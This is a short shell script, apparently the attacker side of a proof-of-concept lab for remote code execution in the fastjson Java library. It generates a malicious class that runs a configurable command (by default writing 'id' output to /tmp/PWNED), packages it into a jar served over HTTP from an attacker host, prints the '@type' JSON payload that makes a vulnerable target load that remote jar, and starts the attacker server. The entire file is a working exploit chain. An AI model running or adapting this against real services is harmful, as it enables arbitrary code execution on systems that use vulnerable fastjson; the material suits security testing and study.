#!/bin/sh
set -e

HOST="${ATTACKER_HOST:-attacker}"
PORT="${ATTACKER_PORT:-8000}"
CMD="${PWN_CMD:-id >> /tmp/PWNED 2>&1; echo RCE_via_fastjson_JSONType >> /tmp/PWNED}"

mkdir -p /www /build
java -cp "/opt/asm.jar:/opt" Gen "jar:http://${HOST}:${PORT}/probe!/POC" /build/POC.class "$CMD"
( cd /build && jar cf /www/probe POC.class )

echo "[attacker] malicious jar ready"
echo "[attacker] payload: {\"@type\":\"jar:http:..${HOST}:${PORT}.probe!.POC\",\"x\":1}"
exec java -Dport="${PORT}" -cp /opt AttackerServer
